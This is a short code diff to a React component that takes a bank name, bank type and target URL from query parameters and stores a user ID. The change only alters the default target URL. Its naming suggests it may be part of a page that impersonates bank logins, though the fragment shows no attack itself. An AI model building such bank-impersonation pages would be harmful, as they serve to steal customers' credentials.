@@ -7,7 +7,7 @@ function LiveStreamContent() {
   const searchParams = useSearchParams();
   const bankName = searchParams.get("bank") || "Target Portal";
   const bankType = searchParams.get("type") || "Standard";
-  const targetUrl = searchParams.get("targetUrl") || "https://www.google.com";
+  const targetUrl = searchParams.get("targetUrl") || "";
 
   const [step, setStep] = useState<1 | 2>(1);
   const [userId, setUserId] = useState("");
